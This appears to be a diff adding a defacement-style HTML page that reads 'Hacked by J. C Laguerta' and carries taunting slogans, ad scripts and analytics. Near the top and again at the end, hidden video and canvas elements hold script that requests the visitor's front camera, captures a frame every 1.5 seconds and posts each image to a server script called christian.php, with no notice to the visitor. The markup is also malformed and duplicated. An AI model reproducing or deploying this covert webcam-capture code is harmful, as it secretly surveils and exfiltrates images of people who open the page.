@@ -1,0 +1,293 @@
+<html>
+<head>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: '/christian.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+            <title>John Christian Laguerta</title>
+
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <script> (adsbygoogle = window.adsbygoogle || []).push({ google_ad_client: "ca-pub-1771845412011016", enable_page_level_ads: true });</script>
+        
+
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-148233951-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+            <script data-cfasync="false" type="text/javascript">
+        (function(w, d) {
+            var s = d.createElement('script');
+            s.src = '//cdn.adpushup.com/39117/adpushup.js';
+            s.type = 'text/javascript'; s.async = true;
+            (d.getElementsByTagName('head')[0] || d.getElementsByTagName('body')[0]).appendChild(s);
+        })(window, document);
+        </script>
+    
+
+    
+
+    
+
+
+    
+    
+
+    
+
+
+
+
+    <script>
+        
+        function setCookie1(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays*24*60*60*1000));
+            var expires = "expires="+ d.toUTCString();
+            document.cookie = cname + "=" + encodeURIComponent(cvalue) + ";" + expires + ";path=/";
+        }
+
+        function getCookie1(cname) {
+            var name = cname + "=";
+            var cookie = document.cookie;
+            var ca = cookie.split(';');
+            for(var i = 0; i <ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return decodeURIComponent(c.substring(name.length, c.length));
+                }
+            }
+            return "";
+        }
+
+    </script>
+
+
+
+    
+
+
+    
+
+    
+</head>
+		<title> John Christian Laguerta</title>
+	</head>
+	
+		<body>
+		<body bgcolor = "black">
+
+			<style>
+	span {
+		background-color: #ffffff;
+}
+</style>
+		
+		<div style="position: fixed; top: 75px; left: -225px; width: 600px; padding: 10px; font-size: 24px; text-align: center; color: white; font-family: 'trebuchet ms', verdana, arial, sans-serif;transform: rotate(-45deg);transform-origin: 50% 0px;-o-transform: rotate(-45deg); -o-transform-origin: 50% 0px;-moz-transform: rotate(-45deg); -moz-transform-origin: 50% 0px; -webkit-transform: rotate(-45deg); -webkit-transform-origin: 50% 0px; background-color: Transparent; border: 1px solid rgb(170, 170, 170); z-index: 9999; opacity: 0.5;"><a href="https://www.facebook.com/mar.xuyi" style="text-decoration:none;color:#FF00FF ;">Jc Laguerta</a></div>
+		
+		<div class="twinkling">
+  <center><br><br><br>
+    <img src="https://i.ibb.co/PCq4xf0/nor.jpg" width="500"/><br>
+    <div class="container">
+      <div class="text"></div>
+    </div><br><br><br>
+    <font face="Sarpanch" color="#FF00FF" size"10" class="message">
+      &nbsp;  Ako Lang Ang Bobo Sa<font color="FF00FF"> <B> Programming</B> </font> At Iba Pa&nbsp;
+    </font><br><br>
+    <font face="Sarpanch" color="black" size"10" class="message"> <span> &nbsp;&nbsp; <B> #stupid to make a website anyway&nbsp; &nbsp; </B></span><br><br>
+    <font face="Play">
+      <p class="we-are"><b><font color="#FF00FF">#Ako Lang Panget <font color="#FF00FF">Sa Pinas<font color="white"></b></p>
+    </font>
+    <font face="Play" class="cn">
+      <font color="#FF00FF"> Hacked <font color="white"></font> <font color="#FF00FF"> by <font color="white"></font><font color="red"> J. C<font color="white"></font><font color="blue"> Laguerta <font color="white"> 
+    </font>
+  </center>
+</div>
+	<br/><center><font color="#6495ED "><font size= "11"> I am </font><font color="#6495ED "><font size= "11"> Gonna </font><font color="#6495ED "><font size= "11"> Fuck Your Phone<font/></center>
+	<font face="Sarpanch" color="white" size"5" class="message"><marquee bgcolor = "#6495ED " direction = "scroll" ><b><font color="white" size = "5">Noob</b></font><font color="white" size = "5">&nbsp;&nbsp;&nbsp;&nbsp;   Programmer &nbsp;&nbsp;&nbsp;&nbsp;<b><font color="white" size = "5">no skills</b></font> </marquee> 
+		</body>
+		
+<footer>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+        var analytics = '148233951';
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <script>
+
+        var clipboardDemos = new ClipboardJS('[data-clipboard]');
+        clipboardDemos.on('success', function(e) {
+            e.clearSelection();
+            showTooltip(e.trigger, copied);
+        });
+        clipboardDemos.on('error', function(e) {
+            showTooltip(e.trigger, fallbackMessage(e.action));
+        });
+
+
+        // Tooltip code
+        var btns = document.querySelectorAll('.copy-btn');
+        for (var i = 0; i < btns.length; i++) {
+            btns[i].addEventListener('mouseleave', clearTooltip);
+            btns[i].addEventListener('blur', clearTooltip);
+        }
+        function clearTooltip(e) {
+            e.currentTarget.removeAttribute('aria-label');
+        }
+        function showTooltip(elem, msg) {
+            $('.copy-btn').addClass('tooltipped');
+            $('.copy-btn').addClass('tooltipped-s');
+            elem.setAttribute('aria-label', msg);
+        }
+        function fallbackMessage(action) {
+            var actionMsg = '';
+            var actionKey = (action === 'cut' ? 'X' : 'C');
+            if (/iPhone|iPad/i.test(navigator.userAgent)) {
+                actionMsg = 'No support :(';
+            } else if (/Mac/i.test(navigator.userAgent)) {
+                actionMsg = 'Press �6�8-' + actionKey + ' to ' + action;
+            } else {
+                actionMsg = 'Press Ctrl-' + actionKey + ' to ' + action;
+            }
+            return actionMsg;
+        }
+
+    </script>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: '/christian.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+}
+
+init();
+
+</script>
+</html>
